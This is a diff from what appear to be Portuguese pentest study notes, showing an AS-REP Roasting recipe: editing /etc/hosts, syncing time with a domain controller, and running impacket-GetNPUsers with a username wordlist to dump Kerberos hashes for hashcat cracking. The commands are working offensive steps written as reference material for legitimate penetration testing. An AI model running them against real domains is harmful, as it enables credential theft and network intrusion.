@@ -8727,7 +8727,8 @@ Gerar arquivo Criptografado com tipo de imagem para o pentest
 - Tipos de ataques ao KERBEROS
 
 `AS-REP Roasting` PRECISA DA LISTA DE USUARIO - NAO ESTAR HABILITADO O PREAUTH - ACERTAR os HORARIOS - ADD HOSTNAME AO HOSTS 
- 
+
+    sudo nano /etc/hosts ADD IP-DC hostname.domain.local 
     sudo net time set -S IP-DC
     impacket-GetNPUsers brasil.floripa.local/ -no-pass -usersfile /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt -format hashcat -outputfile output-reproast - SALVA HASHES DO TIPO krbtg5 e -m 18200 
 
